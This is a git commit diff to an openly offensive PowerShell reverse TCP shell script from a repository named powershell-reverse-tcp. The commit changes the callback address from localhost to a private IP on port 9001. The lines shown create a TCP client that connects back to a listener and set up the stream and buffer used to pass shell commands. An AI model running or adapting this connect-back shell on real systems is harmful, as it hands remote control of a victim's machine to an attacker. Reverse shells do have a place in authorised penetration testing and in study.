afa8101a05a91299255b734ab24d13bd8a0fcb38
snowyhiker <fede10200611@gmail.com>
2024-12-05 14:42:05 +0100

    Update powershell_reverse_tcp.ps1

--- src/invoke_expression/original/powershell_reverse_tcp.ps1
+++ src/invoke_expression/original/powershell_reverse_tcp.ps1
@@ -3,7 +3,7 @@ Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp."
 $client = $stream = $buffer = $writer = $data = $result = $null;
 try {
 	# change the host address and/or port number as necessary
-	$client = New-Object Net.Sockets.TcpClient("127.0.0.1", 9000);
+	$client = New-Object Net.Sockets.TcpClient("10.74.3.207", 9001);
 	$stream = $client.GetStream();
 	$buffer = New-Object Byte[] 1024;
 	$encoding = New-Object Text.UTF8Encoding;
